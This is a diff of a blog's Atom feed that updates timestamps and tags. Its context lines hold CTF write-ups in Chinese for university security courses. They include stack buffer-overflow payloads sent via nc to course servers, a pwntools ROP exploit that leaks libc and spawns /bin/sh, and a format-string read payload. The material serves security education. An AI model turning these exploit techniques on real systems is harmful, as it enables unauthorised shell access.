@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://w181496.twbbs.org/"/>
-  <updated>2017-10-21T09:24:18.000Z</updated>
+  <updated>2017-10-21T16:17:06.000Z</updated>
   <id>http://w181496.twbbs.org/</id>
   
   <author>
@@ -19,7 +19,7 @@
     <link href="http://w181496.twbbs.org/2017/10/15/EDU-CTF-%E8%A8%88%E7%AE%97%E6%A9%9F%E5%AE%89%E5%85%A8/"/>
     <id>http://w181496.twbbs.org/2017/10/15/EDU-CTF-計算機安全/</id>
     <published>2017-10-15T02:34:27.000Z</published>
-    <updated>2017-10-21T09:24:18.000Z</updated>
+    <updated>2017-10-21T16:17:06.000Z</updated>
     <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這堂課是台大、台科大、交大、中央(?聯合的資安課程<br>今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)<br>這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記</p>
 <h2 id="5Bhw0_5D_Pwn_1"><a href="#5Bhw0_5D_Pwn_1" class="headerlink" title="[hw0] Pwn 1"></a>[hw0] Pwn 1</h2><p>0x400566有個<code>callme()</code><br>裡頭就是<code>system(&quot;/bin/sh&quot;)</code><br>overflow蓋return address跳過去即可get shell<br>padding長度40</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;A&quot;x40, &quot;\x66\x05\x40\x00\x00\x00\x00\x00&quot;&apos;</div></pre></td></tr></table></figure>
@@ -48,6 +48,7 @@
 <h2 id="5Bpractice_5D_patching"><a href="#5Bpractice_5D_patching" class="headerlink" title="[practice] patching"></a>[practice] patching</h2><p>把它那個值patch成0x23333即可，可以用hexedit之類的tool去patch<br><code>FLAG{oa11TH80wfMEs6ZflBhGF4btUcS1Ds9y}</code></p>
 <h2 id="5Bpractice_5D_pwntools"><a href="#5Bpractice_5D_pwntools" class="headerlink" title="[practice] pwntools"></a>[practice] pwntools</h2><p>這題正規解法好像是用pwntool寫二分搜玩猜數字(?<br>我比較懶惰直接gdb跑，b main<br>再<code>set $rip=0x400831</code>就會噴惹<br><code>FLAG{h02Ooysbv4O5Lf1Fmdrt2QKts7buYz0J}</code></p>
 <h2 id="5Bhw1_5D_hw1"><a href="#5Bhw1_5D_hw1" class="headerlink" title="[hw1] hw1"></a>[hw1] hw1</h2><p>這題觀察一下，可以發現它會對輸入字串做一些處理<br>它會把每個字元的ASCII值乘上<code>(i+1 &lt;&lt; (i+2) % 0xa) + 0x2333</code><br>最後把得到的值轉成4個char存進檔案中<br>整個加密是可逆的<br>整個反過來做就可以還原FLAG了</p>
+<p>My script:</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">string</span> s;</div><div class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(<span class="string">"flag-ee94f5c9452a6db022db1e4f3a036b375b3ac472"</span>)</span></span>;</div><div class="line">    getline(fin, s);</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>  ; ++i) &#123;</div><div class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> a = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)s[<span class="number">4</span>*i+<span class="number">2</span>];</div><div class="line">        <span class="keyword">int</span> b = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)s[<span class="number">4</span>*i+<span class="number">1</span>];</div><div class="line">        <span class="keyword">int</span> c = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)s[<span class="number">4</span>*i];</div><div class="line">        sum += a * <span class="number">256</span> * <span class="number">256</span> + b * <span class="number">256</span> + c;</div><div class="line">        sum -= <span class="number">9011</span>;</div><div class="line">        <span class="keyword">char</span> ch = sum / ((i + <span class="number">1</span>) &lt;&lt; ((i + <span class="number">2</span>) % <span class="number">0xa</span>));</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; ch;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p><code>FLAG{Iost4SXskSmu53CbCAI5e52FBJkj1JKl}</code></p>
 <h2 id="5Bpractice_5D_bof"><a href="#5Bpractice_5D_bof" class="headerlink" title="[practice] bof"></a>[practice] bof</h2><p>objdump -d -M intel ./bof 可以看到<code>www (0x400686)</code>裡面直接call system<br>算一下buffer overflow padding = 40<br>就跳過去吧<br>payload:<br><code>(perl -e &#39;print &quot;a&quot;x40, &quot;\x86\x06\x40\x00\x00\x00\x00\x00\n&quot;&#39;;cat) | nc csie.ctf.tw 10125</code><br><code>FLAG{vCa9cA1Gkp6BlV0ZrKIdHJlT8fabo6hE}</code></p>
@@ -74,7 +75,7 @@
 <p>exploit:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">buf = <span class="number">0x602000</span> - <span class="number">0x200</span></div><div class="line">buf2 = buf + <span class="number">0x100</span></div><div class="line">pop_rbp = <span class="number">0x400558</span></div><div class="line">pop_rdi = <span class="number">0x4006b3</span></div><div class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></div><div class="line">pop_rdx = <span class="number">0x4006d4</span></div><div class="line">leave = <span class="number">0x40064a</span></div><div class="line"></div><div class="line">read = <span class="number">0x4004e0</span></div><div class="line">puts = <span class="number">0x4004d8</span></div><div class="line">puts_got = <span class="number">0x600fd8</span></div><div class="line">puts_off = <span class="number">0x6f690</span></div><div class="line"></div><div class="line">padding = <span class="string">'a'</span> * (<span class="number">56</span> - <span class="number">8</span>)</div><div class="line"></div><div class="line">r = remote(<span class="string">'csie.ctf.tw'</span>, <span class="number">10132</span>)</div><div class="line"></div><div class="line">r.send(padding + p64(buf) + p64(pop_rdi) + p64(<span class="number">0x00</span>) + p64(pop_rsi_r15) + p64(buf) + p64(<span class="number">0x00</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(read)+ p64(leave))</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">":"</span>)</div><div class="line"></div><div class="line"></div><div class="line">r.send(p64(buf2) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(pop_rdi) + p64(<span class="number">0x0</span>) + p64(pop_rsi_r15) + p64(buf2) + p64(<span class="number">0x0</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(read) + p64(leave) + <span class="string">"\n"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">addr = u64(r.recvuntil(<span class="string">"\n"</span>).strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</div><div class="line">base = addr - puts_off</div><div class="line"><span class="keyword">print</span> addr</div><div class="line"><span class="keyword">print</span> base</div><div class="line"></div><div class="line">system = base + <span class="number">0x45390</span></div><div class="line"></div><div class="line">r.send(p64(buf) + p64(pop_rdi) + p64(buf2+<span class="number">4</span>*<span class="number">8</span>) + p64(system) + <span class="string">"/bin/sh\x00"</span> + <span class="string">"\n"</span>)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
 <p><code>FLAG{49796c31e88bf1c45fc21212693e07cd652296dd}</code></p>
-<h2 id="5Bpractice_5D_cr4ck"><a href="#5Bpractice_5D_cr4ck" class="headerlink" title="[practice] cr4ck"></a>[practice] cr4ck</h2><p>這題就是簡單的fmt任意讀練習<br>塞flag buffer的位址，然後用%7$s去讀位址裡的值<br>64位元底下的位址基本上都一定有NULL byte，所以通常都把位址塞最後<br>所以前面%7$s之類的字串，不足8 bytes的要padding補滿</p>
+<h2 id="5Bpractice_5D_cr4ck"><a href="#5Bpractice_5D_cr4ck" class="headerlink" title="[practice] cr4ck"></a>[practice] cr4ck</h2><p>這題就是簡單的fmt任意讀練習<br>塞flag buffer的位址，然後用<code>%7$s</code>去讀位址裡的值<br>64位元底下的位址，基本上都一定有NULL byte，所以通常都把位址塞最後<br>然後前面<code>%7$s</code>之類的字串，不足8 bytes的要padding補滿</p>
 <p>payload:</p>
 <p><code>perl -e &#39;print &quot;%7\$saaaa\xa0\x0b\x60\x00\x00\x00\x00\x00\n&quot;&#39; | nc csie.ctf.tw 10133</code></p>
 <p>p.s. 在shell用perl送payload的時候，要記得用\跳脫$字號，不然會跟我一樣卡很久QQQQQ</p>
@@ -95,7 +96,7 @@
 <p><code>FLAG{YOUF0UNDtheSECRETFL4G!?}</code></p>
 <h2 id="5Bhw3_5D_readme"><a href="#5Bhw3_5D_readme" class="headerlink" title="[hw3] readme"></a>[hw3] readme</h2><p>覺得略難，等deadline結束再更新吧<br>方法似乎很多種，我的方法就跟提示的解法不太一樣</p>
 <h2 id="5Bhw4_5D_fmtfun4u"><a href="#5Bhw4_5D_fmtfun4u" class="headerlink" title="[hw4] fmtfun4u"></a>[hw4] fmtfun4u</h2><p>一樣等deadline後再更新</p>
-<h2 id="5Bpractice_5D_hacknote"><a href="#5Bpractice_5D_hacknote" class="headerlink" title="[practice] hacknote"></a>[practice] hacknote</h2><p>[未完待續….]</p>
+<h2 id="5Bpractice_5D_hacknote"><a href="#5Bpractice_5D_hacknote" class="headerlink" title="[practice] hacknote"></a>[practice] hacknote</h2><p>[未完待續…]</p>
 ]]></content>
     <summary type="html">
     <![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這堂課是台大、台科大、交大、中央(?聯合的資安課程<br>今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)<br>這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記</p>
@@ -111,6 +112,8 @@
     
       <category term="NTU" scheme="http://w181496.twbbs.org/tags/NTU/"/>
     
+      <category term="Pwn" scheme="http://w181496.twbbs.org/tags/Pwn/"/>
+    
   </entry>
   
   <entry>
@@ -118,7 +121,7 @@
     <link href="http://w181496.twbbs.org/2017/09/06/AIS3-2017-Workshop/"/>
     <id>http://w181496.twbbs.org/2017/09/06/AIS3-2017-Workshop/</id>
     <published>2017-09-06T08:34:36.000Z</published>
-    <updated>2017-09-11T14:39:05.000Z</updated>
+    <updated>2017-10-21T16:17:24.000Z</updated>
     <content type="html"><![CDATA[<p><img src="https://i.imgur.com/jEhADhe.png width:70%" alt=""></p>
 <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>AIS3 workshop是AIS3上課的pwn跟SSRF練習平台。<br>因為平台好像關惹，我也懶得重搞環境打一次<br>所以下面解法很多都是憑著印象打出來的，有錯請見諒</p>
 <h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><a id="more"></a>
@@ -176,6 +179,10 @@
       <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
     
       <category term="CTF" scheme="http://w181496.twbbs.org/tags/CTF/"/>
+    
+      <category term="Pwn" scheme="http://w181496.twbbs.org/tags/Pwn/"/>
+    
+      <category term="Web" scheme="http://w181496.twbbs.org/tags/Web/"/>
     
   </entry>
   
@@ -389,7 +396,7 @@
     <link href="http://w181496.twbbs.org/2017/07/16/AIS3-pre-exam-writeup/"/>
     <id>http://w181496.twbbs.org/2017/07/16/AIS3-pre-exam-writeup/</id>
     <published>2017-07-16T06:07:44.000Z</published>
-    <updated>2017-08-02T14:23:51.000Z</updated>
+    <updated>2017-10-21T16:17:54.000Z</updated>
     <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>因為平常沒在打CTF，也很久沒認真碰這塊，所以最後只有31分 QAQ<br>然後這是我第一次參加AIS3，高手感覺好多，怕</p>
 <p>UPDATE: 最後正取惹，我朋友8x、9x名也正取惹，所以要上應該算容易的(?</p>
 <h2 id="Web_1"><a href="#Web_1" class="headerlink" title="Web 1"></a>Web 1</h2><p>這題直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://quiz.ais3.org:42351/</div></pre></td></tr></table></figure></p>
@@ -435,6 +442,10 @@
       <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
     
       <category term="CTF" scheme="http://w181496.twbbs.org/tags/CTF/"/>
+    
+      <category term="Pwn" scheme="http://w181496.twbbs.org/tags/Pwn/"/>
+    
+      <category term="Web" scheme="http://w181496.twbbs.org/tags/Web/"/>
     
   </entry>
   
@@ -748,7 +759,7 @@
     <link href="http://w181496.twbbs.org/2016/01/16/project1/"/>
     <id>http://w181496.twbbs.org/2016/01/16/project1/</id>
     <published>2016-01-16T15:10:19.000Z</published>
-    <updated>2016-11-24T12:02:23.000Z</updated>
+    <updated>2017-10-21T16:18:15.000Z</updated>
     <content type="html"><![CDATA[<h2 id="u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D"><a href="#u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D" class="headerlink" title="第一題：BOF easy [ pwn ]"></a>第一題：BOF easy [ pwn ]</h2><h3 id="u984C_u76EE"><a href="#u984C_u76EE" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Congrat !!Congrat"</span>);</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Buffer overerflow is easy"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Read your input :"</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    read(fflush0,buf,<span class="number">100</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h3 id="u89E3_u984C_u601D_u8DEF"><a href="#u89E3_u984C_u601D_u8DEF" class="headerlink" title="解題思路"></a>解題思路</h3><p>l33t()中有system(“/bin/sh”)，所以目標就是執行l33t()<br>由code可知buf長度20，但read()讀100個bytes，代表這裡可以buffer overflow<br>並且這題沒有ASLR，所以用objdump可以找出l33t()的address為0x80484fd<br>接著，只需要將main()的return address蓋成0x80484fd即可<br>payload:<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(perl -e &apos;print &quot;A&quot;x32, &quot;\xfd\x84\x04\x08&quot;&apos;;cat) | nc 140.115.53.13 11001</div></pre></td></tr></table></figure></p>
 <h2 id="u7B2C_u4E8C_u984C_uFF1ABSS_overflow__5Bpwn_5D"><a href="#u7B2C_u4E8C_u984C_uFF1ABSS_overflow__5Bpwn_5D" class="headerlink" title="第二題：BSS overflow [pwn]"></a>第二題：BSS overflow [pwn]</h2><h3 id="u984C_u76EE-1"><a href="#u984C_u76EE-1" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> name[<span class="number">200</span>];</div><div class="line"><span class="keyword">char</span> *filename;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	FILE *fp ;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">2704</span>];</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"What's your name ?"</span>);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	filename = <span class="string">"/home/bssof/welcome"</span>;</div><div class="line">	gets(name);</div><div class="line">	fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">	<span class="keyword">if</span>(!fp)&#123;</div><div class="line">		<span class="built_in">puts</span>(<span class="string">"Error !!"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		fread(buf,<span class="number">2704</span>,<span class="number">1</span>,fp);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Goodbye ~ %s\n"</span>,name);</div><div class="line">	fflush(<span class="built_in">stdout</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -784,6 +795,8 @@
       <category term="CTF" scheme="http://w181496.twbbs.org/tags/CTF/"/>
     
       <category term="NCU" scheme="http://w181496.twbbs.org/tags/NCU/"/>
+    
+      <category term="Pwn" scheme="http://w181496.twbbs.org/tags/Pwn/"/>
     
   </entry>
   
